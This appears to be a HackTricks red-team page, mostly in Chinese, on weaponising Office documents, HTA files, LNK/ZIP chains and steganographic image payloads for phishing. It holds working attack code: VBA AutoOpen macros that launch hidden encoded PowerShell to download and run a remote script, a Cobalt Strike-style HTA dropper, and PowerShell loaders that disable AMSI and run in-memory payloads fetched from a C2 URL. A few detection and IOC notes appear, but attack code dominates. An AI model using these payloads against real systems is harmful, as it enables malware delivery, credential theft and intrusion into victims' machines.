# 钓鱼文件与文档

{{#include ../../banners/hacktricks-training.md}}

## Office 文档

Microsoft Word 在打开文件之前会进行文件数据验证。数据验证以数据结构识别的形式，根据 OfficeOpenXML standard 进行。如果在数据结构识别过程中发生任何错误，正在分析的文件将不会被打开。

通常，包含宏的 Word 文件使用 `.docm` 扩展名。但是，可以通过更改文件扩展名来重命名文件，同时仍保留其宏执行能力。\
例如，RTF 文件按设计不支持宏，但如果将 DOCM 文件重命名为 RTF，Microsoft Word 仍会处理该文件并能够执行宏。\
相同的内部机制适用于 Microsoft Office Suite 的所有软件（Excel、PowerPoint 等）。

你可以使用以下命令来检查某些 Office 程序将会执行哪些扩展名：
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### 外部图片加载

转到： _Insert --> Quick Parts --> Field_\
_**Categories**: 链接和引用, **字段名称**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### 宏后门

可以使用宏从文档中运行任意代码。

#### 自动加载函数

它们越常见，被 AV 检测到的概率就越高。

- AutoOpen()
- Document_Open()

#### 宏代码示例
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 手动删除元数据

转到 **File > Info > Inspect Document > Inspect Document**，这会打开 Document Inspector。点击 **Inspect**，然后在 **Document Properties and Personal Information** 旁点击 **Remove All**。

#### 文档扩展名

完成后，从 **Save as type** 下拉菜单中选择，将格式从 **`.docx`** 更改为 **Word 97-2003 `.doc`**。\
这样做是因为你 **can't save macro's inside a `.docx`**，并且对启用宏的 **`.docm`** 扩展存在一种 **污名**（例如缩略图图标有一个巨大的 `!`，一些网络/邮件网关会完全阻止它们）。因此，这种 **传统的 `.doc` 扩展是最佳折衷**。

#### 恶意宏生成器

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.

An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## 强制 NTLM 身份验证

有几种方法可以**“远程”强制 NTLM 身份验证**，例如，你可以在用户会访问的电子邮件或 HTML 中添加**不可见图像**（甚至 HTTP MitM？）。或者向受害者发送会在**打开文件夹时**触发**身份验证**的**文件地址**。

**在以下页面查看这些想法及更多内容：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

别忘了，你不仅可以窃取 hash 或 authentication，还可以 **perform NTLM relay attacks**：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

高效的活动会投递一个 ZIP，包含两个合法的诱饵文档 (PDF/DOCX) 和一个恶意 .lnk。诀窍是实际的 PowerShell loader 存放在 ZIP 的原始字节里，在一个唯一的标记之后，.lnk 会将其提取并在内存中完全运行。

典型流程由 .lnk PowerShell one-liner 实现：

1) 在常见路径中定位原始 ZIP：Desktop、Downloads、Documents、%TEMP%、%ProgramData%，以及当前工作目录的父目录。
2) 读取 ZIP 字节并查找硬编码的标记（例如 xFIQCV）。标记之后的所有内容都是嵌入的 PowerShell payload。
3) 将 ZIP 复制到 %ProgramData%，在那解压，并打开诱饵 .docx 以伪装为合法文件。
4) 为当前进程绕过 AMSI： [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 对下一阶段进行反混淆（例如，移除所有 # 字符），并在内存中执行。

示例 PowerShell 骨架，用于提取并运行嵌入的阶段：
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
- The next stage frequently decrypts base64/XOR shellcode and executes it via Reflection.Emit + VirtualAlloc to minimize disk artifacts.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files containing the ASCII marker string (e.g., xFIQCV) appended to the archive data.
- .lnk that enumerates parent/user folders to locate the ZIP and opens a decoy document.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads ending with links hosted under trusted PaaS domains.

## Steganography-delimited payloads in images (PowerShell stager)

近期的 loader 链会投递混淆过的 JavaScript/VBS，解码并运行一个 Base64 PowerShell stager。该 stager 下载一张图片（常为 GIF），图片在独特的起止标记之间以明文形式包含了 Base64 编码的 .NET DLL。脚本搜索这些分隔符（野外观测到的示例： «<<sudo_png>> … <<sudo_odt>>>»），提取中间文本，进行 Base64 解码为字节，在内存中加载该 assembly 并调用已知入口方法，传入 C2 URL。

Workflow
- Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.
- Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). See more about process hollowing and trusted utility proxy execution here:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell 隐写负载提取器和加载器</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

说明
- This is ATT&CK T1027.003 (steganography/marker-hiding). Markers vary between campaigns.
- AMSI/ETW bypass and string deobfuscation are commonly applied before loading the assembly.
- 检测：扫描下载的图像以查找已知分隔符；识别访问图像并立即解码 Base64 blobs 的 PowerShell。

另见 stego tools 和 carving techniques：

{{#ref}}
../../crypto-and-stego/stego-tricks.md
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

经常出现的初始阶段是一个小的、经过强烈混淆的 `.js` 或 `.vbs`，随归档一起交付。其唯一目的是解码一个嵌入的 Base64 字符串并使用 `-nop -w hidden -ep bypass` 启动 PowerShell，以便通过 HTTPS 引导下一阶段。

骨架逻辑（抽象）：
- 读取自身文件内容
- 在垃圾字符串之间定位 Base64 blob
- 解码为 ASCII PowerShell
- 通过 `wscript.exe`/`cscript.exe` 调用 `powershell.exe` 执行

检测线索
- 归档的 JS/VBS 附件在命令行中包含 `-enc`/`FromBase64String` 并生成 `powershell.exe`。
- 从用户临时路径使用 `wscript.exe` 启动 `powershell.exe -nop -w hidden`。

## Windows 文件以窃取 NTLM 哈希

查看关于 **places to steal NTLM creds** 的页面：

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## 参考

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
